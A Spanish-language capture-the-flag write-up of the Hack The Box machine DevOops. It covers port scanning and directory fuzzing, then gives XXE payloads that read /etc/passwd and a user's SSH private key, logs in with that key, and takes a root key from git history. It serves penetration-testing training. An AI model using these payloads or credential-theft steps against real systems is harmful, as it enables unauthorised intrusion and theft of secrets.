---
layout: post
title: HTB_DevOops
date: 2023/07/10
slug: HTB_DevOops
heroImage: /assets/machines.jpg
---

# DevOops {-}

## Introduccion {-}

La maquina del dia 05/08/2021 se llama DevOops
.

El replay del live se puede ver aqui

[![S4vitaar Tartar Sauce maquina](https://img.youtube.com/vi/NGNca3P9Tec/0.jpg)](https://www.youtube.com/watch?v=NGNca3P9Tec)

No olvideis dejar un like al video y un comentario...
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.91
```
ttl: 63 -> maquina Linux. 
Recordar que en cuanto a ttl se trata 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.91 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,5000 10.10.10.91 -oN targeted
```

| Puerto | Servicio | Que se nos occure? | Que falta?   |
| ------ | -------- | ------------------ | ------------ |
| 22     | ssh      | Acceso directorio  | Credenciales |
| 5000   | http     | Web, fuzzing       |              |


### Analizando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.91:5000
```

Nada muy interesante

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p5000 10.10.10.91 -oN webScan
```

No nos detecta nada

#### Chequear la web por puerto 5000 {-}

Con firefox navegamos en la web para ver lo que es. 

- Under construction
- la web es una simple imagen
- hablan de 
```bash
 .py 
```

- vemos usuarios

Como no hay nada interesante vamos a por WFUZZ

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.91:5000/FUZZ
```

Encontramos una ruta 
```bash
 /feed 
```
 y 
```bash
 /upload 
```
. Lo chequeamos en firefox. 

#### Chequeamos la ruta upload {-}

Vemos una pagina que nos permite uploadear ficheros. Parece que tenemos que uploadear ficheros XML que tiene que tener los elementos
siguientes:

- Author
- Subject
- Content

Huele a **XXE** pero primero tratamos de ver si podemos uploadear ficheros de otro tipo.

creamos ficheros

1. fichero **txt**

    ```bash
    vi test.txt

    EEEEEEE
    ```

1. fichero **php**

    ```php
    vi test.php

    <?php
        echo "EEEEEEEEEEE";
    ?>
    ```

Cuando los uploadeamos no se ve nada. No sabemos si la web nos subio los archivos o no. Intentamos con un fichero XML

```xml
vi test.xml

<elements>
    <Author>S4vitar</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Lo uploadeamos y ahora vemos que el Blogpost a sido processado, vemos los elementos **Author** **Subject** **Content** y que lo a guardado en

```bash
 /home/roosa/deploy/src 
```
 y que la url para **later reference** es 
```bash
 /uploads/test.xml 
```


Si miramos lo que hay en 
```bash
 http://10.10.10.91:5000/upload/test.xml 
```
 vemos el contenido de nuestro fichero XML




## Evaluacion de vulnerabilidades {-}

### XXE {-}

Si la web nos reporta el contenido de un campo XML, los attackantes pueden approvechar de una *ENTITY* para remplazar el campo reportado
por el contenido de un fichero interno de la maquina.

En este caso, vemos que el campo **Author** esta reportado en la web y le indicamos que queremos ver el contenido del 
```bash
 /etc/passwd 
```
 en su lugar.

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Uploadeamos el fichero y si vamos en 
```bash
 http://10.10.10.91:5000/upload/nombre-del-fichero.xml 
```
 vemos que podemos ver el contenido del 
```bash
 /etc/passwd 
```
 de la 
maquina.

Como hemos visto que havia un usuario llamado **roosa**, intentamos ver si tiene un fichero 
```bash
 id_rsa 
```


```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<elements>
    <Author>&xxe;</Author>
    <Subject>EEEEEEEEE</Subject>
    <Content>EEEAEAEAAAEAAEAE</Content>
</elements>
```

Despues de subir este nuevo fichero podemos ver la id_rsa del usuario roosa.



## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Conexion por SSH {-}

Como ya tenemos una id_rsa nos conectaremos como el usuario roosa

```bash
chmod 600 id_rsa
ssh -i id_rsa roosa@10.10.10.91
```

Ya estamos conectados como Roosa y podemos leer la flag.





## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
```

Aqui vemos que el usuario roosa esta en el grupo sudo pero no tenemos su contraseña. Listando los ficheros del usuario **roosa**
vemos que hay muchos ficheros, lo analizamos mas en profundidad.

```bash
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep -v ".local"
```

Aqui no llama la atencion un directorio que contiene un 
```bash
 .git 
```
. Sabiendo que repositorios **git** contienen un historico de tratamiento
de ficheros nos dirigimos en este proyecto y miramos el historico de comits.

```bash
cd work/blogfeed/
ls -la
git log
```

mirando el historico, vemos un mensaje un poco turbio **reverted accidental commit with proper key**

miramos lo que a passado en este commit. Nos copiamos el identificador del commit.

```bash
git log -p 33e87c312c08735a02fa9c796021a4a3023129ad
```

Aqui vemos que han borrado un key para ponerle otra. La copiamos y de la misma manera que con el usuario roosa, intentamos conectarnos como
root por ssh.

```bash
ssh -i id_rsa2 root@10.10.10.91
```

Y hemos podido entrar... Ya podemos examinar la flag.

